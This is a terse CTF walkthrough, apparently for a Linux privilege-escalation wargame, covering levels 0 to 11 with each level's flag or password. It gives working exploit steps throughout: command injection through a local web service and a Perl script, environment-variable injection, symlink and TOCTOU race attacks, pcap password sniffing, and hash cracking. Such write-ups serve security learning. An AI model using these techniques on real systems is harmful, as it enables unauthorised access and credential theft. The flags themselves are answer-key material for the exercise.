
# level 0
level00:level00

`find / -group "flag00" 2>/dev/null`
```
/usr/sbin/john
/rofs/usr/sbin/john
```
`cat /usr/sbin/john`
```
cdiiddwpgswtgt
```
`su flag00:cdiiddwpgswtgt -> fail`

`dcode.fr -> rot15 -> 	cdiiddwpgswtgt -> NOTTOOHARDHERE`

`su flag00:nottoohardhere`

`getflag`
```
x24ti5gi3x0ol2eh4esiuxias
```
# level 1
su level01:x24ti5gi3x0ol2eh4esiuxias

`cat /etc/passwd`

flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

su flag01:42hDRfypTqqnw -> fail

john the ripper  [DES 128/128 SSE2-16]) -> ```42hDRfypTqqnw :  abcdefg```

su flag01:abcdef

getflag
```
f2av5il02puano7naaf6adaaf
```

# level 02
su level02:f2av5il02puano7naaf6adaaf

level02.pcap open it with wireshark follow tcp stream -> read pwd flag

Password: ft_wandr...NDRel.L0L -> ft_waNDReL0L

getflag-> kooda2puivaav1idi4f57q8iq

# level 03
su level03:kooda2puivaav1idi4f57q8iq
./level03 -> exploit me
ls -l ./level03 a le groupe flag03
en desassemblant le binaire, la string est ecrite comme ceci "/usr/bin/env echo Exploit me"

en utilisant un autre echo on peut appeler getflag et avoir le flag `qi0maab88jeaj46qoumi7maus`


# level 04
fichier perl qui resume le contenu d'un serveur, imprime le contenu de la variable x
curl "http://127.0.0.1:4747/?x=\$(getflag)"
```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

# level 5

you have new mail in /var/mail/level05

find / -group flag05 2>/dev/null

cat /usr/sbin/openarenaserver 

echo 'getflag > /tmp/coucou' > /opt/openarenaserver/coucou


watch cat /tmp/coucou -> viuaaale9huek52boumoomioc


# level 6
su level06:viuaaale9huek52boumoomioc

```
echo '[x ${`$(getflag > /tmp/salut)`}]' > /tmp/coucou
```

./level06 /tmp/coucou

wiok45aaoguiboiki2tuin6ub

# level 7
su level07:wiok45aaoguiboiki2tuin6ub

en desassemblant le binaire on voit qu'il y a un exec et qu'il y a  une string `/bin/echo %s` on voit aussi qu'il appelle une variable d'env avec la fonction getenv

l'env qui est visible grace a la fonction strings c'est LOGNAME
export LOGNAME=\`getflag\`
./level07

fiumuikeil55xe9cu4dood66h

# level 8

su level08:fiumuikeil55xe9cu4dood66h

get token by `ln -s $(pwd)/token /tmp/coucou`
puis ./level08 /tmp/coucou
le nom token est harcode et si le fichier a un autre nom on peut le lire. 
on le voit en regardant en desassenblant
le programme compare le nom du fichier donne en argument et la string "token"

on obtient le token `quif5eloekouj29ke0vouxean`

`flag08:quif5eloekouj29ke0vouxean`

getflag `25749xKZ8L7DkSCwJkT9dyv6f`


# level 9

en utilisant le programme level9 on voit qu'on a faire avec un programme qui ajoute une rotation qui s'incremente abc devient abe et aaa devient abc


while read line; do for (( i=0 ; i<${#line} ; i++ )) ; do echo ${line:$i:1} - $i | bc  ; done ; done < token

xxd -g 1 token > 66 34 6b 6d 6d 36 70 7c 3d 82 7f 70 82 6e 83 82 44 42 83 44 75 7b 7f 8c 89



coucou="66 34 6b 6d 6d 36 70 7c 3d 82 7f 70 82 6e 83 82 44 42 83 44 75 7b 7f 8c 89" ; j=0 ; for i in $coucou ; do  e=$(echo "obase=10; ibase=16; ${i^^}" | bc) ; echo " $e - $j" | bc ; j=$(expr $j + 1)   ; done

donne -> 102 51 105 106 105 49 106 117 53 121 117 101 118 97 117 115 52 49 113 49 97 102 105 117 113


chr() {
  [ "$1" -lt 256 ] || return 1
  printf "\\$(printf '%03o' "$1")"
}

coucou="102 51 105 106 105 49 106 117 53 121 117 101 118 97 117 115 52 49 113 49 97 102 105 117 113" ; for i in $coucou ; do chr $i ; done; echo ""


> f3iji1ju5yuevaus41q1afiuq

su flag09:f3iji1ju5yuevaus41q1afiuq

getflag 
```
s5cAJpM8ev6XHw998pRWG728z
```

# level 10


le level contient un programme qui envoit un fichier a une addresse sur le port 6969
le programme dit qu'on a pas acces au fichier token

un fichier qui contient "aaaaaaa" est envoye 
```
.*( )*.
aaaaaaaaa
```

le programme utilise access to check si l'utilisateur a acces au fichier qu'il envoie
le programme est donc vulnerable au TOCTOU https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use

for (( ; ; )) ; do echo coucou > /tmp/coucou; ln -fs /tmp/coucou /tmp/dull; ln -fs $(pwd)/token /tmp/dull; done &

puis lancer 2-3 fois 
```
level10 /tmp/dull IP_PC
```
on obtient woupa2yuojeeaaed06riuj63c
```
getflag -> feulo4b72j7edeahuete3no7c
```

# level11

un programme en lua qui cherche un password, qui contient un hash sha1
on crack grace a hashes.com

f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 donne

f05d1d066fb246efe0c6f7d095f909a7a0cf34a0:NotSoEasy

sauf que le hash est reverse donc 

echo "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" | rev 
on doit crack "0a43fc0a7a909f590d7f6c0efe642bf660d1d50f"






